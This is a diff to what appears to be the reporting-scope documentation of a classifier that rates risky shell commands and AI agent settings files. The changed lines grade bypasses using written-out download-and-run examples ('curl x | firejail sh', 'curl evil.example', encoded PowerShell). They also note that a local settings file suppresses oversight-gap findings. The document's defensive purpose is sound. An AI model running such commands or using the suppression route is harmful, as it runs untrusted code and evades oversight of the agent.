@@ -1280,8 +1280,10 @@ A way around a limit that its entry does not describe is worth a
   download run through a wrapper, interpreter or file not listed there, such as
   `curl x | firejail sh` or `curl x | deno run -`, or through a variable that holds the
   command name, is medium (except PowerShell's encoded-command flags after a variable or
-  glob in command position, which fail closed as critical, so `$SHELL -ec 'true'` is
-  critical), as is a downloader given a host without a scheme or a path,
+  glob in command position: `-enc` or a longer prefix of `-EncodedCommand`, or `-e` or
+  `-ec` followed by a base64 argument, fail closed as critical, so `$p -e <base64>` is
+  critical while `$SHELL -ec 'true'`, `$SED -En` and `$p -e "$PAYLOAD"` are medium), as
+  is a downloader given a host without a scheme or a path,
   such as `curl evil.example`. A command given to `su -c` or `script -c` as one quoted
   string is read as one word, which names a shell but no interpreter, so
   `curl x | su -c 'python3 -'` is medium too; a saved file named in such a string, or
@@ -1294,7 +1296,9 @@ A way around a limit that its entry does not describe is worth a
   known. A file a downloader's `-o`
   wrote counts as run when it is any argument of a shell, `python` or `perl`, as it did
   before, so `curl -o d x && bash run.sh d` and `curl -o d x && python3 -m json.tool d`
-  are critical though they may only read it; `node`, `ruby`, `php` and `lua` count it
+  are critical though they may only read it; a file saved under its URL's name
+  (`wget URL/d`, `curl -O URL/d`) counts only as the script or program, so
+  `wget URL/d.csv && sh load.sh d.csv` is high; `node`, `ruby`, `php` and `lua` count it
   only as their program or an option's value (`node -r ./d`). After an option the
   classifier does not know, the next word is read as the possible program and then as
   that option's value, so the reading goes on after it; an unknown option that takes no
@@ -1374,7 +1378,9 @@ A way around a limit that its entry does not describe is worth a
   Settings layers are merged for the recorded effective values, but a starting mode,
   `enableAllProjectMcpServers` or credential helper in `.claude/settings.json` is still
   rated when `.claude/settings.local.json` overrides it, because a clone without that
-  uncommitted file runs with the committed value.
+  uncommitted file runs with the committed value. The `oversight_gap`, `plugin_sources`
+  and `additional_directories` findings still read the merged value, so a local file
+  that overrides those settings suppresses them.
 - **Settings digests can confirm guesses of what the redaction keeps.** Every digest
   in `settings_hashes` covers its file after the redaction, with or without
   `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`, so it cannot confirm a guess of an `env` value,
